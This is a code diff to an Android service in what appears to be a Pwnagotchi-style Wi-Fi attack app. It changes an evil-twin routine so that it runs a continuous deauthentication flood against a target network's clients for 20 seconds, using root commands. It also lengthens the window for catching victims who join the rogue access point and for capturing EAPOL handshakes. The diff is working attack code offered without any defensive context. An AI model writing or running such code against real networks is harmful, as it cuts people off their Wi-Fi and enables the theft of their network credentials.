@@ -176,16 +176,23 @@ public class PwngService extends Service {
     }
 
     private boolean doEvilTwin(String bssid, String ssid, int freq, boolean deauth) {
+        // Start deauth thread FIRST (runs continuously during Evil Twin)
+        Thread deauthThread = null;
         try {
             if (deauth) {
-                brain.currentStatus = "👊 deauth " + ssid;
-                updateNotification();
-                for (int i = 0; i < 3; i++) {
-                    execSu("/data/data/com.pwnagotchi.app/deauth " + IFACE + " " + bssid +
-                           " ff:ff:ff:ff:ff:ff " + freq);
-                    sleep(200);
-                }
-            }
+                deauthThread = new Thread(() -> {
+                    brain.currentStatus = "👊 deauth " + ssid + " (continuous)";
+                    updateNotification();
+                    long end = System.currentTimeMillis() + 20000;
+                    while (System.currentTimeMillis() < end && isRunning) {
+                        execSu("/data/data/com.pwnagotchi.app/deauth " + IFACE + " " + bssid
+                               + " ff:ff:ff:ff:ff:ff " + freq);
+                        sleep(500);
+                    }
+                });
+                deauthThread.start();
+                sleep(1000);
+            } // end if(deauth)
             
             // Disable all saved networks so phone doesn't auto-reconnect to home WiFi
             execSu("wpa_cli -p " + WPA_CTRL + " -i " + IFACE + " list_networks 2>&1 | tail -n +2 | while read line; do "
@@ -201,7 +208,7 @@ public class PwngService extends Service {
             
             boolean caught = false;
             long start = System.currentTimeMillis();
-            while (System.currentTimeMillis() - start < 15000) {
+            while (System.currentTimeMillis() - start < 25000) {   // 25s window
                 String log = execSu("logcat -d -s hostapd:* 2>&1 | grep -E 'EAPOL|AP-STA-CONNECTED' | tail -3");
                 if (log.contains("AP-STA-CONNECTED") || log.contains("EAPOL")) {
                     caught = true;
@@ -215,6 +222,9 @@ public class PwngService extends Service {
                 }
                 sleep(3000);
             }
+            
+            // Stop deauth thread
+            if (deauthThread != null) deauthThread.interrupt();
             
             if (caught) { brain.currentFace = FACES.get("FRIEND"); brain.currentStatus = "🎭 CAUGHT: " + ssid; }
             else brain.currentStatus = "🎭 no client for " + ssid;
